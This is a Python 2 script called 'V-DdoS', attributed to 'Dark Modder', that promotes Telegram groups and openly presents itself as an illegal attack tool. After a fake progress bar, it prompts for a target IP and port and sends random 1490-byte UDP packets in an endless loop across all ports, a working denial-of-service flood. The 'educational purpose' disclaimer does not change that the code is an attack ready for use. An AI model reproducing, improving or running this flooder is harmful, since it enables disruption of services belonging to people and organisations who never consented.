print ("
______¶¶
______¶¶______________¶¶¶¶¶
______¶¶¶____________¶¶¶¶¶¶¶
______¶¶¶____________¶¶¶¶¶¶¶¶
_____¶¶¶¶___________¶¶¶¶¶¶¶¶¶
___¶¶¶¶¶¶¶__________¶¶¶¶¶¶¶¶¶¶
___¶¶¶¶_____________¶¶¶¶¶¶¶¶¶¶
____¶¶_______________¶¶¶¶¶¶¶¶¶¶
____¶¶_____________¶¶¶¶¶¶¶¶¶¶¶
_____¶¶_______________¶¶¶¶¶¶¶
_____¶¶__________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
_____¶¶¶_______¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
_____¶¶¶___¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
______¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
______¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶¶¶¶___¶¶¶¶
__________________¶¶¶¶¶¶¶¶¶¶¶¶¶____¶¶¶¶
___________________¶¶¶¶¶¶¶¶¶¶¶______¶¶¶¶
____________________¶¶¶¶¶¶¶¶¶¶_______¶¶¶
___________________¶¶¶¶¶¶¶¶¶¶_________¶¶¶
__________________¶¶¶¶¶¶¶¶¶¶¶_________¶¶¶
_________________¶¶¶¶¶¶¶¶¶¶¶¶__________¶¶
________________¶¶¶¶¶¶¶¶¶¶¶¶¶__________¶¶
_______________¶¶¶¶¶¶¶¶¶¶¶¶¶¶___________¶¶
______________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___________¶¶
_____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___________¶¶¶
____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___________¶_¶¶
____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____________¶¶
___________¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶
___________¶¶¶¶¶¶¶______¶¶¶¶¶¶¶¶
__________¶¶¶¶¶¶¶________¶¶¶¶¶¶¶
__________¶¶¶¶¶¶__________¶¶¶¶¶¶¶
_________¶¶¶¶¶¶____________¶¶¶¶¶¶
_________¶¶¶¶¶______________¶¶¶¶¶¶
________¶¶¶¶¶________________¶¶¶¶¶¶
_______¶¶¶¶¶__________________¶¶¶¶¶¶
______¶¶¶¶¶_____________________¶¶¶¶¶¶
_____¶¶¶¶¶_______________________¶¶¶¶¶¶
_____¶¶¶¶¶________________________¶¶¶¶¶¶
____¶¶¶¶¶__________________________¶¶¶¶¶¶
____¶¶¶¶____________________________¶¶¶¶¶¶
___¶¶¶¶_______________________________¶¶¶¶
___¶¶¶_________________________________¶¶¶¶
___¶¶¶__________________________________¶¶¶
__¶¶¶____________________________________¶¶¶
_¶¶¶_____________________________________¶¶¶
¶¶¶¶______________________________________¶¶¶
__________________________________________¶¶¶
")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet V-DdoS")
print
print "Coded By : Dark Modder"
print "Author   : Dark Modder"
print "Github   : github.com/AllwaysDark"
print "Telegram : Dazai_FreeSrc_Owner"
print "Telegram cl : t.me/Dazai_FreeSrc"
print "Telegram gc : t.me/ALLWAYSDARKGROUP"
print "Join ALLWAYSDARKGROUP TG Group To Get Premium Apk(s) Free"
print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
print("\033[93m")
os.system("figlet DdoS Attack")
print("Team : Allways Dark")
print ("\033[92m")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

